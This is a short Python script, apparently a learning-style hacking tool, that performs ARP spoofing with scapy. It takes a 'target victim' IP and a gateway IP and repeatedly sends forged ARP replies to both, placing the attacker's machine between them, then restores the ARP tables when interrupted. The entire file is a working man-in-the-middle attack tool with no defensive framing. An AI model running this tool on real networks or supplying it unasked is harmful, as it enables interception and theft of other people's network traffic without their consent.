import time

import scapy.all as scapy
import time
import sys
import optparse


def get_args():
    parser =optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP Address of the target victim")
    parser.add_option("-g", "--gateway", dest="gateway", help="IP Address of the gateway or router")

    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify target IP, use --help for more info")
    if not options.gateway:
        parser.error("[-] Please specify Gateway IP, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


option = get_args()
target_ip = option.target
gateway_ip = option.gateway
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("\r[+] Sent " + str(sent_packets_count) + " Packets"),
        sys.stdout.flush()
        sent_packets_count += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting ...... Restoring ARP tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
